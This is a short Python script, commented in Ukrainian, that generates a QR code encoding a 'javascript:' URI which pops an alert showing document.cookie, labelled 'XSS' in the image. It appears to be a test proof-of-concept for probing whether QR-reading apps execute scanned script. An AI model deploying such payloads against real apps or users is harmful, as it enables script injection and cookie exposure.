import qrcode
from PIL import Image, ImageDraw, ImageFont

# Тестовий payload для QR
payload = "javascript:alert('Test QR - document.domain: ' + document.cookie)"

# Створюємо QR-код
qr = qrcode.QRCode(
    version=1,
    error_correction=qrcode.constants.ERROR_CORRECT_H,  # Вищий рівень корекції, щоб QR залишався читабельним навіть із текстом
    box_size=10,
    border=4,
)
qr.add_data(payload)
qr.make(fit=True)

# Генеруємо зображення
img = qr.make_image(fill_color="black", back_color="white").convert("RGB")

# Малюємо поверх
draw = ImageDraw.Draw(img)

# Вибираємо шрифт (може треба замінити шлях залежно від ОС)
try:
    font = ImageFont.truetype("arial.ttf", 40)  # Windows/Linux
except:
    font = ImageFont.load_default()  # fallback

# Розмір тексту
text = "XSS"
text_width, text_height = draw.textsize(text, font=font)

# Центр QR-коду
img_width, img_height = img.size
x = (img_width - text_width) // 2
y = (img_height - text_height) // 2

# Малюємо напівпрозорий прямокутник під текстом (щоб було видно)
draw.rectangle(
    [(x - 5, y - 5), (x + text_width + 5, y + text_height + 5)],
    fill="white"
)

# Малюємо текст
draw.text((x, y), text, font=font, fill="red")

# Зберігаємо у файл
img.save("test_qr_xss_with_text.png")

print("✅ QR-код збережено у файл test_qr_xss_with_text.png із написом 'XSS'")

